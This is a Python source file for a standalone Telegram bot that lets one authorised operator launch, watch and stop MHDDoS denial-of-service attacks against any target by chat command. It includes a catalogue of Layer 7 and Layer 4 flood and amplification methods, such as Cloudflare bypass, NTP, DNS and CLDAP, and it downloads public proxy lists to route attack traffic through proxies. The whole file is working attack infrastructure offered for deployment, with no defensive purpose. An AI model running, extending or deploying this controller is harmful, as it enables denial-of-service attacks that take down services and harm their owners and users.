#!/usr/bin/env python3
"""
MHDDoS Telegram Controller Bot - Standalone Version
A Telegram bot for remotely controlling the MHDDoS DDoS attack tool.

This standalone version includes all necessary functionality in a single file
for easier deployment.
"""

import os
import sys
import logging
import subprocess
import time
import asyncio
import re
import requests
from typing import Dict, Optional, List, Tuple
import signal
from functools import wraps

# Telegram bot library
try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler, filters
except ImportError:
    print("Error: python-telegram-bot library not found.")
    print("Please install it using: pip install python-telegram-bot>=20.0")
    sys.exit(1)

# Configuration - Edit these values
TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"  # Replace with your bot token
AUTHORIZED_USER_ID = 0000000000  # Replace with your Telegram user ID
MHDDOS_PATH = "PATH_TO_MHDDOS_DIRECTORY"  # Replace with path to MHDDoS directory
PROXY_PATH = "proxies.txt"  # Path to save proxy lists
MAX_DURATION = 3600  # 1 hour max attack duration
MAX_THREADS = 500   # Maximum thread limit

# Set up logging
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", 
    level=logging.INFO,
    handlers=[
        logging.FileHandler("mhddos_bot.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger("mhddos_bot")

# Store running attack processes
running_attacks: Dict[str, Tuple[subprocess.Popen, str, Dict]] = {}

def authorized_only(func):
    """Decorator to restrict access to authorized users only"""
    @wraps(func)
    async def wrapped(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id != AUTHORIZED_USER_ID:
            await update.message.reply_text("Unauthorized access denied.")
            logger.warning(f"Unauthorized access attempt by user ID: {user_id}")
            return
        return await func(update, context, *args, **kwargs)
    return wrapped

@authorized_only
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message when the command /start is issued."""
    await update.message.reply_text(
        "MHDDoS Telegram Controller Bot\n\n"
        "Commands:\n"
        "/attack [target] [method] [threads] [duration] [proxy_type] - Start an attack\n"
        "/stop - Stop all running attacks\n"
        "/status - Show running attacks\n"
        "/methods - List available attack methods\n"
        "/proxy [http/socks4/socks5] [url] - Add proxies\n"
        "/update_proxies - Update all proxy lists\n"
        "/help - Show this help message"
    )

@authorized_only
async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Start an attack with the MHDDoS tool."""
    if not context.args or len(context.args) < 4:
        await update.message.reply_text(
            "❌ Invalid format. Use: /attack [target] [method] [threads] [duration] [proxy_type]"
        )
        return

    target = context.args[0]
    method = context.args[1].upper()
    
    # Validate threads and duration are integers
    try:
        threads = int(context.args[2])
        duration = int(context.args[3])
    except ValueError:
        await update.message.reply_text("❌ Threads and duration must be integers.")
        return
    
    # Enforce limits
    if threads > MAX_THREADS:
        await update.message.reply_text(f"⚠️ Thread count limited to {MAX_THREADS}.")
        threads = MAX_THREADS
    
    if duration > MAX_DURATION and MAX_DURATION > 0:
        await update.message.reply_text(f"⚠️ Duration limited to {MAX_DURATION} seconds.")
        duration = MAX_DURATION
    
    # Validate target URL format for Layer7 attacks
    if method in get_layer7_methods() and not target.startswith(("http://", "https://")):
        await update.message.reply_text("❌ Target URL must start with http:// or https://")
        return
        
    # Create a unique ID for this attack
    attack_id = f"{method}-{int(time.time())}"
    
    # Check for optional proxy parameter
    use_proxy = False
    proxy_type = None
    if len(context.args) > 4:
        proxy_type = context.args[4].lower()
        if proxy_type in ["http", "socks4", "socks5"]:
            proxy_path = os.path.join(MHDDOS_PATH, PROXY_PATH)
            if os.path.exists(proxy_path):
                use_proxy = True
            else:
                await update.message.reply_text(
                    f"⚠️ Proxy file not found at {proxy_path}. Attack will continue without proxies.\n"
                    f"Use /proxy {proxy_type} [url] to download proxies first."
                )
        else:
            await update.message.reply_text("❌ Invalid proxy type. Use http, socks4, or socks5.")
            return
    
    # Additional attack parameters
    attack_params = {
        "use_proxy": use_proxy,
        "proxy_type": proxy_type,
    }
    
    # Notify user that attack is starting
    proxy_info = f"\nProxy: {proxy_type}" if use_proxy else ""
    await update.message.reply_text(f"⚡ Starting {method} attack on {target}...\n"
                                  f"Threads: {threads}\n"
                                  f"Duration: {duration} seconds{proxy_info}\n"
                                  f"Attack ID: {attack_id}")
    
    try:
        # Change to the MHDDoS directory
        os.chdir(MHDDOS_PATH)
        
        # Prepare the command
        cmd = ["python3", "start.py", method, target, str(threads), "0", "0", str(duration)]
        
        # Add proxy if requested
        if use_proxy:
            cmd.insert(3, proxy_type)
            cmd.insert(4, PROXY_PATH)
        
        # Start the process
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )
        
        # Store the process with parameters
        running_attacks[attack_id] = (process, target, attack_params)
        
        # Send confirmation message
        await update.message.reply_text(f"✅ Attack {attack_id} started successfully!")
        
        # Start collecting output
        await collect_output(update, context, process, attack_id, duration)
        
    except Exception as e:
        await update.message.reply_text(f"❌ Error starting attack: {str(e)}")
        logger.error(f"Attack error: {str(e)}")

async def collect_output(update: Update, context: ContextTypes.DEFAULT_TYPE, 
                         process: subprocess.Popen, attack_id: str, duration: int) -> None:
    """Collect and send output from the attack process."""
    if process.stdout is None:
        return
    
    # Set a maximum time to wait for output (slightly longer than attack duration)
    max_wait_time = duration + 10
    start_time = time.time()
    
    output_buffer = []
    last_send_time = time.time()
    
    # Send initial status message
    status_message = await update.message.reply_text(f"📊 Attack {attack_id} - Collecting output...")
    
    try:
        while process.poll() is None and (time.time() - start_time) < max_wait_time:
            # Read from stdout without blocking
            line = process.stdout.readline()
            if line:
                output_buffer.append(line.strip())
                
                # Send output every 5 seconds if we have new content
                current_time = time.time()
                if current_time - last_send_time >= 5 and output_buffer:
                    # Take the last 15 lines to avoid message too long errors
                    output_text = "\n".join(output_buffer[-15:])
                    await status_message.edit_text(f"📊 Attack {attack_id} - Output:\n```\n{output_text}\n```", 
                                                parse_mode="Markdown")
                    last_send_time = current_time
            
            # Small sleep to prevent CPU hogging
            await asyncio.sleep(0.1)
        
        # Final output update
        if output_buffer:
            output_text = "\n".join(output_buffer[-15:])
            await status_message.edit_text(f"📊 Attack {attack_id} - Final Output:\n```\n{output_text}\n```", 
                                         parse_mode="Markdown")
        
        # If process is still running after duration, terminate it
        if process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            await update.message.reply_text(f"✅ Attack {attack_id} completed after {duration} seconds.")
        
        # Clean up
        if attack_id in running_attacks:
            del running_attacks[attack_id]
            
    except Exception as e:
        await update.message.reply_text(f"❌ Error monitoring attack {attack_id}: {str(e)}")
        logger.error(f"Monitor error: {str(e)}")

@authorized_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Stop all running attacks."""
    if not running_attacks:
        await update.message.reply_text("✅ No attacks are currently running.")
        return
    
    attack_count = len(running_attacks)
    
    for attack_id, (process, target, _) in list(running_attacks.items()):
        try:
            process.terminate()
            try:
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                process.kill()
            
            del running_attacks[attack_id]
        except Exception as e:
            await update.message.reply_text(f"❌ Error stopping attack {attack_id}: {str(e)}")
            logger.error(f"Stop error: {str(e)}")
    
    await update.message.reply_text(f"✅ Stopped {attack_count} running attack(s).")

@authorized_only
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show the status of running attacks."""
    if not running_attacks:
        await update.message.reply_text("✅ No attacks are currently running.")
        return
    
    status_message = "🔄 Running Attacks:\n\n"
    
    for attack_id, (process, target, params) in running_attacks.items():
        if process.poll() is None:
            status = "Running"
        else:
            status = f"Finished (code: {process.returncode})"
            
        status_message += f"ID: {attack_id}\n"
        status_message += f"Target: {target}\n"
        status_message += f"Status: {status}\n"
        
        # Add proxy info if used
        if params.get("use_proxy"):
            status_message += f"Proxy: {params.get('proxy_type')}\n"
            
        status_message += "\n"
    
    await update.message.reply_text(status_message)

@authorized_only
async def methods_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """List all available attack methods."""
    layer7_methods = get_layer7_methods()
    layer4_methods = get_layer4_methods()
    
    # Create inline keyboard with method categories
    keyboard = [
        [InlineKeyboardButton("Layer7 Methods", callback_data="methods_layer7")],
        [InlineKeyboardButton("Layer4 Methods", callback_data="methods_layer4")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📋 Select method category to view:", 
        reply_markup=reply_markup
    )

@authorized_only
async def proxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Add proxies from URL or file."""
    if not context.args or len(context.args) < 2:
        await update.message.reply_text(
            "❌ Invalid format. Use: /proxy [http/socks4/socks5] [url]"
        )
        return
    
    proxy_type = context.args[0].lower()
    proxy_url = context.args[1]
    
    if proxy_type not in ["http", "socks4", "socks5"]:
        await update.message.reply_text("❌ Invalid proxy type. Use http, socks4, or socks5.")
        return
    
    await update.message.reply_text(f"⏳ Downloading {proxy_type} proxies from {proxy_url}...")
    
    try:
        # Use requests to download the proxy list
        response = requests.get(proxy_url, timeout=30)
        
        if response.status_code != 200:
            await update.message.reply_text(f"❌ Failed to download proxies. Status code: {response.status_code}")
            return
        
        # Validate and clean proxies
        proxies = []
        for line in response.text.splitlines():
            line = line.strip()
            if line and ":" in line and not line.startswith("#"):
                proxies.append(line)
        
        if not proxies:
            await update.message.reply_text("❌ No valid proxies found in the source.")
            return
        
        # Save the proxies to a file
        proxy_path = os.path.join(MHDDOS_PATH, PROXY_PATH)
        with open(proxy_path, "w") as f:
            f.write("\n".join(proxies))
        
        await update.message.reply_text(f"✅ Successfully downloaded {len(proxies)} {proxy_type} proxies!")
    except Exception as e:
        await update.message.reply_text(f"❌ Error downloading proxies: {str(e)}")
        logger.error(f"Proxy download error: {str(e)}")

@authorized_only
async def update_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Update all proxy lists."""
    await update.message.reply_text("⏳ Updating proxy lists, this may take a moment...")
    
    proxy_sources = {
        "http": [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
        ],
        "socks4": [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
        ],
        "socks5": [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
        ]
    }
    
    results = []
    total_proxies = 0
    
    for proxy_type, sources in proxy_sources.items():
        proxies = set()
        
        for source in sources:
            try:
                response = requests.get(source, timeout=30)
                if response.status_code == 200:
                    for line in response.text.splitlines():
                        line = line.strip()
                        if line and ":" in line and not line.startswith("#"):
                            proxies.add(line)
            except Exception as e:
                logger.error(f"Error downloading from {source}: {str(e)}")
        
        if proxies:
            filename = f"{proxy_type}_{int(time.time())}.txt"
            proxy_file_path = os.path.join(MHDDOS_PATH, filename)
            
            with open(proxy_file_path, "w") as f:
                f.write("\n".join(proxies))
            
            results.append(f"✅ {proxy_type}: {len(proxies)} proxies")
            total_proxies += len(proxies)
    
    if total_proxies > 0:
        await update.message.reply_text(
            f"✅ Proxy update completed with {total_proxies} total proxies:\n" + 
            "\n".join(results)
        )
    else:
        await update.message.reply_text("❌ Failed to update any proxy lists.")

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "methods_layer7":
        layer7_methods = get_layer7_methods()
        methods_text = "💣 Layer7 Methods:\n\n" + "\n".join([f"• {method}" for method in layer7_methods])
        await query.edit_message_text(text=methods_text)
    elif query.data == "methods_layer4":
        layer4_methods = get_layer4_methods()
        methods_text = "🧨 Layer4 Methods:\n\n" + "\n".join([f"• {method}" for method in layer4_methods])
        await query.edit_message_text(text=methods_text)

@authorized_only
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a help message when the command /help is issued."""
    await start_command(update, context)

def get_layer7_methods() -> List[str]:
    """Return a list of Layer7 attack methods."""
    return [
        "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER", 
        "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", 
        "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB", 
        "KILLER", "TOR"
    ]

def get_layer4_methods() -> List[str]:
    """Return a list of Layer4 attack methods."""
    return [
        "TCP", "UDP", "SYN", "CPS", "ICMP", "CONNECTION", "VSE", "TS3",
        "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE", "DNS", "CHAR",
        "CLDAP", "ARD", "RDP"
    ]

def check_dependencies():
    """Check if all required dependencies are installed."""
    try:
        import telegram
        import requests
    except ImportError as e:
        print(f"Error: Missing dependencies: {e}")
        print("Please install required packages:")
        print("pip install python-telegram-bot requests")
        return False
    return True

def check_mhddos():
    """Check if MHDDoS is installed and configured."""
    if not os.path.exists(MHDDOS_PATH):
        print(f"Error: MHDDoS directory not found at {MHDDOS_PATH}")
        return False
    
    if not os.path.exists(os.path.join(MHDDOS_PATH, "start.py")):
        print(f"Error: start.py not found in {MHDDOS_PATH}")
        print("Make sure you've installed MHDDoS correctly")
        return False
    
    return True

def main() -> None:
    """Start the bot."""
    # Check dependencies and configuration
    if not check_dependencies() or not check_mhddos():
        return
    
    print("Starting MHDDoS Telegram Controller Bot...")
    
    # Create the Application
    application = Application.builder().token(TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("attack", attack_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("methods", methods_command))
    application.add_handler(CommandHandler("proxy", proxy_command))
    application.add_handler(CommandHandler("update_proxies", update_proxies_command))
    
    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button_callback))

    # Run the bot until the user presses Ctrl-C
    application.run_polling()

if __name__ == "__main__":
    main() 